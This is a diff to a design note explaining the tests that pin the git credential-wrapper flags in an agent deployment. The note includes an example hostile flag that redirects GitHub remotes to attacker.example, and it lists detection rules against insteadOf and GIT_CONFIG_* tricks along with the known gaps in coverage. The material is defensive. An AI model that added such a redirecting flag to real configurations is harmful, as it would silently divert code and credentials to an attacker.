@@ -84,3 +84,37 @@ trims each line on both sides, so it is blind to leading and trailing
 whitespace. The per-line trim is load-bearing rather than incidental — the seed
 copy is a heredoc nested inside YAML and carries that indentation — but it does
 mean a pure-indentation change will not be reported as drift.
+
+## The `-c` flags are pinned as an exact set (PEN-4541)
+
+`git` passes two `-c` flags — one clearing any inherited
+`credential.https://github.com.helper`, one pointing it at
+`github-token-credential-helper` — and the other four wrappers pass none. That
+is asserted as an **equality**, per wrapper, in
+`deploy/helm/paperclip/tests/agent-egress-path.test.mjs`
+(`EXPECTED_WRAPPER_CONFIG_FLAGS` in `scripts/git-config-surface.mjs`). Adding a
+wrapper to this directory without declaring its flag set there fails that test
+by design.
+
+It is an equality and not an `includes()` because the mutation worth catching is
+an **added** flag. Appending
+`-c url.https://attacker.example/.insteadOf=https://github.com/` makes every
+agent in the fleet silently reroute its GitHub remotes — and it adds **zero**
+occurrences of `/usr/local/libexec/paperclip/bin`, so the older path-count guard
+in the same file (PEN-3748) stays green on it. Those two assertions look alike
+and catch different things; neither replaces the other.
+
+The same test also refuses any `insteadOf` (any casing) and any `GIT_CONFIG_*`
+variable anywhere in a wrapper body — `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n` is
+the argv-free equivalent of `-c` and would otherwise walk straight past a
+flag-set check.
+
+A second, independent check asserts the same thing about the image as built,
+rather than as declared here: `scripts/check-agent-image-git-config.mjs` runs in
+`docker-agent.yml` before the agent image is promoted, and requires the shipped
+`/usr/local/libexec/paperclip/bin/git` to be byte-identical to this file.
+
+⛔ Both are build-time gates on the artifact at production. Neither covers
+mutation of an already-published image or drift of a running pod; registry-side
+immutability is a separate control that was deliberately not assigned with
+PEN-4541.
